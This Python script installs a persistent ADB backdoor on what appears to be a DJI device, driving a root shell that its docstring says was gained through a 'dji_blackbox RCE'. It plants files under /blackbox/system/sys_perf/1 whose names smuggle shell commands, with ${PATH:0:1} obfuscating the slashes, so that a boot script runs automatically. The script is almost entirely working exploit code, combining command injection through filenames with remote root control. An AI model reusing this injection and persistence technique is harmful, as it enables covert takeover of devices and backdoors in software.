"""install_hook.py - install/validate/remove the sys_perf perma-ADB hook.

Talks to the session root shell (dji_blackbox RCE) on 192.168.60.2:4444.
This script never writes /system or /vendor. It only:
  - creates/removes four tiny hook filenames under
    /blackbox/system/sys_perf/1, and
  - touches /data/dji hook state files.

Usage:
  py -3.12 install_hook.py --check
  py -3.12 install_hook.py --benign          # touch /data/dji/hook_ok only
  py -3.12 install_hook.py --arm             # run /data/dji/boot-adb.sh at boot
  py -3.12 install_hook.py --kill            # touch /data/dji/perma_off
  py -3.12 install_hook.py --resume          # remove /data/dji/perma_off
  py -3.12 install_hook.py --remove          # delete the hook files
  py -3.12 install_hook.py --arm --dry-run

Always run --benign first and confirm /data/dji/hook_ok appears before --arm.
"""
import argparse
import socket
import sys
import time

HOST = "192.168.60.2"
PORT = 4444
DIR = "/blackbox/system/sys_perf/1"
N = 4
BOOT = "/data/dji/boot-adb.sh"


def run(cmds):
    s = socket.create_connection((HOST, PORT), timeout=8)
    s.settimeout(10)
    marker = "__HOOK_DONE_%d__" % int(time.time())
    script = "\n".join(cmds) + "\necho " + marker + "\n"
    s.sendall(script.encode())
    data = b""
    try:
        while True:
            chunk = s.recv(8192)
            if not chunk:
                break
            data += chunk
            if marker.encode() in data:
                break
    except socket.timeout:
        pass
    s.close()
    return data.decode("utf-8", "replace").replace(marker, "").rstrip()


def hook_names(benign):
    if benign:
        tail = "x=${PATH:0:1};touch ${x}data${x}dji${x}hook_ok"
    else:
        tail = "x=${PATH:0:1};sh ${x}data${x}dji${x}boot-adb.sh"
    return ["ktop.log.99999%02d;%s" % (i, tail) for i in range(1, N + 1)]


def main():
    ap = argparse.ArgumentParser()
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("--check", action="store_true")
    g.add_argument("--benign", action="store_true")
    g.add_argument("--arm", action="store_true")
    g.add_argument("--kill", action="store_true")
    g.add_argument("--resume", action="store_true")
    g.add_argument("--remove", action="store_true")
    ap.add_argument("--dry-run", action="store_true")
    a = ap.parse_args()

    if a.check:
        print(run(['echo "== %s =="; ls -l %s 2>&1 | grep -E "ktop.log.99999|total" || true'
                   % (DIR, DIR)]))
        print(run(['echo "== state =="; '
                   'ls -l /data/dji/perma_ok /data/dji/perma_off 2>&1; '
                   'getprop sys.usb.state; getprop init.svc.adbd']))
        return

    if a.kill:
        cmds = ["touch /data/dji/perma_off; echo kill switch set"]
        print("\n".join(cmds) if a.dry_run else run(cmds))
        return

    if a.resume:
        cmds = ["rm -f /data/dji/perma_off; echo kill switch removed"]
        print("\n".join(cmds) if a.dry_run else run(cmds))
        return

    if a.remove:
        cmds = ['rm -f %s/ktop.log.99999* 2>&1; echo removed; ls -l %s 2>&1 | head'
                % (DIR, DIR)]
        print("\n".join(cmds) if a.dry_run else run(cmds))
        return

    names = hook_names(a.benign)
    cmds = ["mkdir -p %s" % DIR]
    for n in names:
        cmds.append("touch '%s/%s'" % (DIR, n))
    cmds.append("ls -l %s | grep ktop.log.99999 || true" % DIR)
    if a.dry_run:
        print("\n".join(cmds))
        return
    print(run(cmds))
    print("[*] hook installed (%s). It fires within ~60 s; check with --check."
          % ("benign" if a.benign else BOOT))


if __name__ == "__main__":
    main()
